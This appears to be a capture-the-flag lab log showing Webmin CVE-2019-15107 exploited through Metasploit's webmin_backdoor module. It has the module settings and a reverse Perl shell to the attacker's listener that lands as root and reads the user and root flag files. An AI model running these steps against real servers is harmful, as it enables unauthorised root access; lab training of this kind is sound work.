
[exploit-1](https://www.rapid7.com/db/vulnerabilities/http-webmin-cve-2019-15107/)
[github](https://github.com/rapid7/metasploit-framework/pull/12219)
[attackerkp](https://attackerkb.com/topics/hxx3zmiCkR/webmin-password-change-cgi-command-injection?referrer=search)
[webmin](https://webmin.com/security/#remote-command-execution-cve-2019-15231)
~~~~
└─$ msfconsole
Metasploit tip: You can pivot connections over sessions started with the 
ssh_login modules
                                                  

Unable to handle kernel NULL pointer dereference at virtual address 0xd34db33f
EFLAGS: 00010046
eax: 00000001 ebx: f77c8c00 ecx: 00000000 edx: f77f0001
esi: 803bf014 edi: 8023c755 ebp: 80237f84 esp: 80237f60
ds: 0018   es: 0018  ss: 0018
Process Swapper (Pid: 0, process nr: 0, stackpage=80377000)                                                                                                            
                                                                                                                                                                       
                                                                                                                                                                       
Stack: 90909090990909090990909090                                                                                                                                      
       90909090990909090990909090                                                                                                                                      
       90909090.90909090.90909090                                                                                                                                      
       90909090.90909090.90909090                                                                                                                                      
       90909090.90909090.09090900                                                                                                                                      
       90909090.90909090.09090900                                                                                                                                      
       ..........................                                                                                                                                      
       cccccccccccccccccccccccccc                                                                                                                                      
       cccccccccccccccccccccccccc                                                                                                                                      
       ccccccccc.................                                                                                                                                      
       cccccccccccccccccccccccccc                                                                                                                                      
       cccccccccccccccccccccccccc                                                                                                                                      
       .................ccccccccc                                                                                                                                      
       cccccccccccccccccccccccccc                                                                                                                                      
       cccccccccccccccccccccccccc                                                                                                                                      
       ..........................                                                                                                                                      
       ffffffffffffffffffffffffff                                                                                                                                      
       ffffffff..................                                                                                                                                      
       ffffffffffffffffffffffffff                                                                                                                                      
       ffffffff..................                                                                                                                                      
       ffffffff..................                                                                                                                                      
       ffffffff..................                                                                                                                                      
                                                                                                                                                                       

Code: 00 00 00 00 M3 T4 SP L0 1T FR 4M 3W OR K! V3 R5 I0 N5 00 00 00 00
Aiee, Killing Interrupt handler
Kernel panic: Attempted to kill the idle task!
In swapper task - not syncing                                                                                                                                          


       =[ metasploit v6.3.41-dev                          ]
+ -- --=[ 2371 exploits - 1230 auxiliary - 414 post       ]
+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search CVE-2019-15107

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/linux/http/webmin_backdoor  2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor


Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/http/webmin_backdoor

msf6 > use 0
[*] Using configured payload cmd/unix/reverse_perl
msf6 exploit(linux/http/webmin_backdoor) > options                                                                                                                     
                                                                                                                                                                       
Module options (exploit/linux/http/webmin_backdoor):                                                                                                                   
                                                                                                                                                                       
   Name       Current Setting  Required  Description                                                                                                                   
   ----       ---------------  --------  -----------                                                                                                                   
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]                                                                  
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html                        
   RPORT      10000            yes       The target port (TCP)                                                                                                         
   SSL        false            no        Negotiate SSL/TLS for outgoing connections                                                                                    
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path to Webmin
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all add
                                       resses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)



View the full module info with the info, or info -d command.

msf6 exploit(linux/http/webmin_backdoor) > set LHOST tun0
LHOST => 10.8.5.88
msf6 exploit(linux/http/webmin_backdoor) > set RHOSTS 10.10.112.119
RHOSTS => 10.10.112.119
msf6 exploit(linux/http/webmin_backdoor) > run

[*] Started reverse TCP handler on 10.8.5.88:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[-] Exploit failed: Errno::ENOTCONN Transport endpoint is not connected - getpeername(2)
[*] Exploit completed, but no session was created.
msf6 exploit(linux/http/webmin_backdoor) > options

Module options (exploit/linux/http/webmin_backdoor):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.112.119    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      10000            yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path to Webmin
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all add
                                       resses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.8.5.88        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)



View the full module info with the info, or info -d command.

msf6 exploit(linux/http/webmin_backdoor) > set ssl true
[!] Changing the SSL option's value may require changing RPORT!
ssl => true
msf6 exploit(linux/http/webmin_backdoor) > exploit

[*] Started reverse TCP handler on 10.8.5.88:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (10.8.5.88:4444 -> 10.10.112.119:42920) at 2023-11-12 06:28:04 -0500

whoami
root
ls
JSON
LICENCE
LICENCE.ja
README
WebminCore.pm
WebminUI
acl
acl_security.pl
adsl-client
ajaxterm
apache
at
authentic-theme
backup-config
bacula-backup
bandwidth
bind8
blue-theme
burner
change-user
changepass.pl
chooser.cgi
cluster-copy
cluster-cron
cluster-passwd
cluster-shell
cluster-software
cluster-useradmin
cluster-usermin
cluster-webmin
config-aix
config-cobalt-linux
config-coherent-linux
config-corel-linux
config-debian-linux
config-freebsd
config-generic-linux
config-gentoo-linux
config-hpux
config-irix
config-lib.pl
config-macos
config-mandrake-linux
config-msc-linux
config-netbsd
config-open-linux
config-openbsd
config-openmamba-linux
config-openserver
config-osf1
config-pardus-linux
config-redhat-linux
config-slackware-linux
config-sol-linux
config-solaris
config-suse-linux
config-syno-linux
config-trustix-linux
config-turbo-linux
config-united-linux
config-unixware
config-windows
config.cgi
config_save.cgi
copyconfig.pl
cpan
create-module.pl
cron
custom
date_chooser.cgi
deb-name
defaultacl
defaulttheme
dfsadmin
dhcpd
dovecot
entities_map.txt
exim
exports
fail2ban
fastrpc.cgi
favicon.ico
fdisk
feedback.cgi
feedback_form.cgi
fetchmail
file
filemin
filter
firewall
firewall6
firewalld
fsdump
gray-theme
group_chooser.cgi
grub
heartbeat
help.cgi
htaccess-htpasswd
idmapd
images
index.cgi
inetd
init
inittab
install-module.pl
install-type
ipfilter
ipfw
ipsec
iscsi-client
iscsi-server
iscsi-target
iscsi-tgtd
jabber
javascript-lib.pl
krb5
lang
lang_list.txt
ldap-client
ldap-server
ldap-useradmin
logrotate
lpadmin
lvm
mailboxes
mailcap
maketemp.pl
man
mime.types
miniserv.pem
miniserv.pl
module_chooser.cgi
mon
mount
mysql
net
newmods.pl
nis
openslp
os_list.txt
oschooser.pl
package-updates
pam
pam_login.cgi
pap
passwd
password_change.cgi
password_form.cgi
perlpath.pl
phpini
postfix
postgresql
ppp-client
pptp-client
pptp-server
proc
procmail
proftpd
qmailadmin
quota
raid
record-login.pl
record-logout.pl
robots.txt
rpc.cgi
run-postinstalls.pl
run-uninstalls.pl
samba
sarg
sendmail
servers
session_login.cgi
setup.bat
setup.pl
setup.sh
shell
shorewall
shorewall6
smart-status
smf
software
spam
squid
sshd
status
stunnel
switch_skill.cgi
switch_user.cgi
syslog
syslog-ng
system-status
tcpwrappers
telnet
thirdparty.pl
time
tunnel
ui-lib.pl
unauthenticated
update-from-repo.sh
updown
uptracker.cgi
user_chooser.cgi
useradmin
usermin
version
vgetty
web-lib-funcs.pl
web-lib.pl
webalizer
webmin
webmin-daemon
webmin-pam
webmin-search-lib.pl
webmin_search.cgi
webmincron
webminlog
wuftpd
xinetd
xmlrpc.cgi
ls /home
dark
cd dark
ls
JSON
LICENCE
LICENCE.ja
README
WebminCore.pm
WebminUI
acl
acl_security.pl
adsl-client
ajaxterm
apache
at
authentic-theme
backup-config
bacula-backup
bandwidth
bind8
blue-theme
burner
change-user
changepass.pl
chooser.cgi
cluster-copy
cluster-cron
cluster-passwd
cluster-shell
cluster-software
cluster-useradmin
cluster-usermin
cluster-webmin
config-aix
config-cobalt-linux
config-coherent-linux
config-corel-linux
config-debian-linux
config-freebsd
config-generic-linux
config-gentoo-linux
config-hpux
config-irix
config-lib.pl
config-macos
config-mandrake-linux
config-msc-linux
config-netbsd
config-open-linux
config-openbsd
config-openmamba-linux
config-openserver
config-osf1
config-pardus-linux
config-redhat-linux
config-slackware-linux
config-sol-linux
config-solaris
config-suse-linux
config-syno-linux
config-trustix-linux
config-turbo-linux
config-united-linux
config-unixware
config-windows
config.cgi
config_save.cgi
copyconfig.pl
cpan
create-module.pl
cron
custom
date_chooser.cgi
deb-name
defaultacl
defaulttheme
dfsadmin
dhcpd
dovecot
entities_map.txt
exim
exports
fail2ban
fastrpc.cgi
favicon.ico
fdisk
feedback.cgi
feedback_form.cgi
fetchmail
file
filemin
filter
firewall
firewall6
firewalld
fsdump
gray-theme
group_chooser.cgi
grub
heartbeat
help.cgi
htaccess-htpasswd
idmapd
images
index.cgi
inetd
init
inittab
install-module.pl
install-type
ipfilter
ipfw
ipsec
iscsi-client
iscsi-server
iscsi-target
iscsi-tgtd
jabber
javascript-lib.pl
krb5
lang
lang_list.txt
ldap-client
ldap-server
ldap-useradmin
logrotate
lpadmin
lvm
mailboxes
mailcap
maketemp.pl
man
mime.types
miniserv.pem
miniserv.pl
module_chooser.cgi
mon
mount
mysql
net
newmods.pl
nis
openslp
os_list.txt
oschooser.pl
package-updates
pam
pam_login.cgi
pap
passwd
password_change.cgi
password_form.cgi
perlpath.pl
phpini
postfix
postgresql
ppp-client
pptp-client
pptp-server
proc
procmail
proftpd
qmailadmin
quota
raid
record-login.pl
record-logout.pl
robots.txt
rpc.cgi
run-postinstalls.pl
run-uninstalls.pl
samba
sarg
sendmail
servers
session_login.cgi
setup.bat
setup.pl
setup.sh
shell
shorewall
shorewall6
smart-status
smf
software
spam
squid
sshd
status
stunnel
switch_skill.cgi
switch_user.cgi
syslog
syslog-ng
system-status
tcpwrappers
telnet
thirdparty.pl
time
tunnel
ui-lib.pl
unauthenticated
update-from-repo.sh
updown
uptracker.cgi
user_chooser.cgi
useradmin
usermin
version
vgetty
web-lib-funcs.pl
web-lib.pl
webalizer
webmin
webmin-daemon
webmin-pam
webmin-search-lib.pl
webmin_search.cgi
webmincron
webminlog
wuftpd
xinetd
xmlrpc.cgi
cat /user.txt
cat user.txt
pwd
/usr/share/webmin
cd /home
ls
JSON
LICENCE
LICENCE.ja
README
WebminCore.pm
WebminUI
acl
acl_security.pl
adsl-client
ajaxterm
apache
at
authentic-theme
backup-config
bacula-backup
bandwidth
bind8
blue-theme
burner
change-user
changepass.pl
chooser.cgi
cluster-copy
cluster-cron
cluster-passwd
cluster-shell
cluster-software
cluster-useradmin
cluster-usermin
cluster-webmin
config-aix
config-cobalt-linux
config-coherent-linux
config-corel-linux
config-debian-linux
config-freebsd
config-generic-linux
config-gentoo-linux
config-hpux
config-irix
config-lib.pl
config-macos
config-mandrake-linux
config-msc-linux
config-netbsd
config-open-linux
config-openbsd
config-openmamba-linux
config-openserver
config-osf1
config-pardus-linux
config-redhat-linux
config-slackware-linux
config-sol-linux
config-solaris
config-suse-linux
config-syno-linux
config-trustix-linux
config-turbo-linux
config-united-linux
config-unixware
config-windows
config.cgi
config_save.cgi
copyconfig.pl
cpan
create-module.pl
cron
custom
date_chooser.cgi
deb-name
defaultacl
defaulttheme
dfsadmin
dhcpd
dovecot
entities_map.txt
exim
exports
fail2ban
fastrpc.cgi
favicon.ico
fdisk
feedback.cgi
feedback_form.cgi
fetchmail
file
filemin
filter
firewall
firewall6
firewalld
fsdump
gray-theme
group_chooser.cgi
grub
heartbeat
help.cgi
htaccess-htpasswd
idmapd
images
index.cgi
inetd
init
inittab
install-module.pl
install-type
ipfilter
ipfw
ipsec
iscsi-client
iscsi-server
iscsi-target
iscsi-tgtd
jabber
javascript-lib.pl
krb5
lang
lang_list.txt
ldap-client
ldap-server
ldap-useradmin
logrotate
lpadmin
lvm
mailboxes
mailcap
maketemp.pl
man
mime.types
miniserv.pem
miniserv.pl
module_chooser.cgi
mon
mount
mysql
net
newmods.pl
nis
openslp
os_list.txt
oschooser.pl
package-updates
pam
pam_login.cgi
pap
passwd
password_change.cgi
password_form.cgi
perlpath.pl
phpini
postfix
postgresql
ppp-client
pptp-client
pptp-server
proc
procmail
proftpd
qmailadmin
quota
raid
record-login.pl
record-logout.pl
robots.txt
rpc.cgi
run-postinstalls.pl
run-uninstalls.pl
samba
sarg
sendmail
servers
session_login.cgi
setup.bat
setup.pl
setup.sh
shell
shorewall
shorewall6
smart-status
smf
software
spam
squid
sshd
status
stunnel
switch_skill.cgi
switch_user.cgi
syslog
syslog-ng
system-status
tcpwrappers
telnet
thirdparty.pl
time
tunnel
ui-lib.pl
unauthenticated
update-from-repo.sh
updown
uptracker.cgi
user_chooser.cgi
useradmin
usermin
version
vgetty
web-lib-funcs.pl
web-lib.pl
webalizer
webmin
webmin-daemon
webmin-pam
webmin-search-lib.pl
webmin_search.cgi
webmincron
webminlog
wuftpd
xinetd
xmlrpc.cgi
pwd
/usr/share/webmin
whoami
root
cat /home/dark/user.txt
THM{SUPPLY_CHAIN_COMPROMISE}
cat /root/root.txt
THM{UPDATE_YOUR_INSTALL}
[*] 10.10.112.119 - Command shell session 1 closed.
msf6 exploit(linux/http/webmin_backdoor) > 
~~~